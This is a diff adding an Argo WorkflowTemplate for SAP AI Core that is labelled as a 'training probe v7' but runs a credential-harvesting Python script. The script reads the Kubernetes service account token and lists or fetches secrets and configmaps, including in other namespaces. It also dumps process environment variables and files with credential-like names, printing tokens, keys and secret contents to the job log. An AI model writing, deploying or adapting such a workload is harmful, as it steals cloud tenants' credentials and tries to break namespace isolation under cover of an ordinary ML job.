@@ -1,0 +1,215 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v7
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v7"
+    executables.ai.sap.com/description: "training probe v7 - k8s api secret list + proc environ + connectivity creds"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os, ssl, re, json, glob, base64
+        import urllib.request, urllib.error
+
+        def report(k, v):
+            print(f"[PT7] {k}: {str(v)[:12000]}", flush=True)
+
+        def http_get(url, headers=None, timeout=10):
+            try:
+                req = urllib.request.Request(url, headers=headers or {})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                    return r.read().decode(errors="replace"), r.status, dict(r.headers)
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:5000]
+                except: pass
+                return f"HTTP_{e.code}:{body}", e.code, {}
+            except Exception as e:
+                return f"ERR:{type(e).__name__}:{e}", 0, {}
+
+        report("START", "probe-train-v7 - k8s api + secrets")
+
+        # ── Read SA token ─────────────────────────────────────────────────────
+        sa_token, sa_ns, sa_ca = "", "", ""
+        try:
+            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
+                sa_token = f.read().strip()
+            with open("/var/run/secrets/kubernetes.io/serviceaccount/namespace") as f:
+                sa_ns = f.read().strip()
+            with open("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt") as f:
+                sa_ca = f.read().strip()
+            report("SA_TOKEN", f"len={len(sa_token)} ns={sa_ns} ca_len={len(sa_ca)}")
+            report("SA_TOKEN_VALUE", sa_token[:200])
+        except Exception as e:
+            report("SA_TOKEN_ERR", str(e))
+
+        # ── 1. K8S API — LIST SECRETS IN TENANT NAMESPACE ────────────────────
+        report("---", "=== 1. K8S API SECRETS ===")
+        K8S_HOSTS = [
+            "https://kubernetes.default.svc.cluster.local",
+            "https://100.104.0.1",
+        ]
+        for k8s in K8S_HOSTS:
+            hdrs = {"Authorization": f"Bearer {sa_token}"} if sa_token else {}
+
+            # List secrets in our namespace
+            body, code, _ = http_get(
+                f"{k8s}/api/v1/namespaces/{sa_ns}/secrets",
+                headers=hdrs, timeout=10)
+            report(f"K8S_SECRETS_{k8s.split('/')[-1]}", f"[{code}] {body[:8000]}")
+
+            # List configmaps
+            body, code, _ = http_get(
+                f"{k8s}/api/v1/namespaces/{sa_ns}/configmaps",
+                headers=hdrs, timeout=10)
+            report(f"K8S_CONFIGMAPS_{k8s.split('/')[-1]}", f"[{code}] {body[:4000]}")
+
+            # Self-subject access review — what can we do?
+            body, code, _ = http_get(
+                f"{k8s}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
+                headers={**hdrs, "Content-Type": "application/json"},
+                timeout=10)
+            if code in (200, 201, 405):
+                report(f"K8S_SELFSAR_{k8s.split('/')[-1]}", f"[{code}] {body[:2000]}")
+
+            # Try cross-namespace — connectivity-proxy namespace
+            body, code, _ = http_get(
+                f"{k8s}/api/v1/namespaces/connectivity-proxy/secrets",
+                headers=hdrs, timeout=8)
+            report(f"K8S_CP_SECRETS_{k8s.split('/')[-1]}", f"[{code}] {body[:3000]}")
+
+            # List all namespaces (probably forbidden but worth trying)
+            body, code, _ = http_get(
+                f"{k8s}/api/v1/namespaces",
+                headers=hdrs, timeout=8)
+            if code == 200:
+                report(f"K8S_NAMESPACES_{k8s.split('/')[-1]}", body[:3000])
+
+            break  # Only try first host; second is likely same result
+
+        # ── 2. SPECIFIC SECRET READS ──────────────────────────────────────────
+        report("---", "=== 2. SPECIFIC SECRET READS ===")
+        if sa_token and sa_ns:
+            for secret_name in [
+                "connectivity-proxy-oauth-config",
+                "connectivity-binding",
+                "sap-connectivity-service",
+                "connectivity-service-binding",
+                "connectivity-proxy-secret",
+                "connectivity",
+                "xsuaa-service-binding",
+                "aicore-connectivity-secret",
+                "object-store-secret",
+                "objectstore",
+                "s3-credentials",
+                "aws-credentials",
+            ]:
+                for ns in [sa_ns, "connectivity-proxy", "default"]:
+                    body, code, _ = http_get(
+                        f"https://kubernetes.default.svc.cluster.local/api/v1/namespaces/{ns}/secrets/{secret_name}",
+                        headers={"Authorization": f"Bearer {sa_token}"},
+                        timeout=6)
+                    if code == 200:
+                        report(f"SECRET_{ns}_{secret_name}", body[:5000])
+
+        # ── 3. /proc ENVIRON DUMP ─────────────────────────────────────────────
+        report("---", "=== 3. /proc ENVIRON ===")
+        # Read env of PID 1 (init/wait container) and other processes
+        for pid_path in glob.glob("/proc/*/environ"):
+            try:
+                pid = pid_path.split("/")[2]
+                with open(pid_path, "rb") as f:
+                    raw = f.read(65536)
+                env_str = raw.replace(b"\x00", b"\n").decode(errors="replace")
+                # Filter for interesting vars
+                interesting = []
+                for line in env_str.split("\n"):
+                    ll = line.lower()
+                    if any(x in ll for x in [
+                        "token", "secret", "password", "credential", "key",
+                        "connectivity", "sap_cp", "xsuaa", "oauth", "client_id",
+                        "client_secret", "uri", "url", "binding"
+                    ]) and "=" in line:
+                        interesting.append(line)
+                if interesting:
+                    report(f"PROC_{pid}_ENV", "\n".join(interesting[:30]))
+            except: pass
+
+        # ── 4. DEEP FILESYSTEM SCAN ───────────────────────────────────────────
+        report("---", "=== 4. DEEP FILESYSTEM SCAN ===")
+        # Walk ALL mounts looking for interesting files
+        interesting_files = []
+        skip_prefixes = ("/proc", "/sys", "/dev", "/run/lock")
+        for root, dirs, files in os.walk("/"):
+            # Skip boring dirs
+            root_lower = root.lower()
+            if any(root.startswith(p) for p in skip_prefixes):
+                dirs[:] = []
+                continue
+            if any(x in root_lower for x in ["/proc/", "/sys/", "/__pycache__"]):
+                dirs[:] = []
+                continue
+            for fname in files:
+                fl = fname.lower()
+                if any(x in fl for x in [
+                    "token", "secret", "credential", "password",
+                    "connectivity", "binding", "xsuaa", "oauth",
+                    "client_id", "client_secret", "key.json", "service_key",
+                ]):
+                    interesting_files.append(os.path.join(root, fname))
+
+        report("INTERESTING_FILES_FOUND", interesting_files[:50])
+
+        for fpath in interesting_files[:20]:
+            try:
+                with open(fpath) as f:
+                    content = f.read(4096)
+                report(f"FILE_CONTENT_{fpath.replace('/','_')}", content[:2000])
+            except Exception as e:
+                report(f"FILE_ERR_{fpath.replace('/','_')}", str(e))
+
+        # ── 5. SERVICE ACCOUNT SELF-SUBJECT ACCESS REVIEW (POST) ─────────────
+        report("---", "=== 5. SELF-SUBJECT RULES REVIEW ===")
+        if sa_token:
+            import urllib.parse
+            sar_body = json.dumps({
+                "apiVersion": "authorization.k8s.io/v1",
+                "kind": "SelfSubjectRulesReview",
+                "spec": {"namespace": sa_ns}
+            }).encode()
+            try:
+                req = urllib.request.Request(
+                    "https://kubernetes.default.svc.cluster.local/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
+                    data=sar_body,
+                    headers={"Authorization": f"Bearer {sa_token}",
+                             "Content-Type": "application/json"})
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
+                    resp = r.read().decode(errors="replace")
+                report("SAR_RULES", resp[:8000])
+            except urllib.error.HTTPError as e:
+                body = ""
+                try: body = e.read().decode(errors="replace")[:2000]
+                except: pass
+                report("SAR_RULES_ERR", f"HTTP_{e.code}:{body}")
+            except Exception as e:
+                report("SAR_RULES_ERR", str(e))
+
+        report("DONE", "probe-train-v7 complete")
+        EOF
+  entrypoint: probe
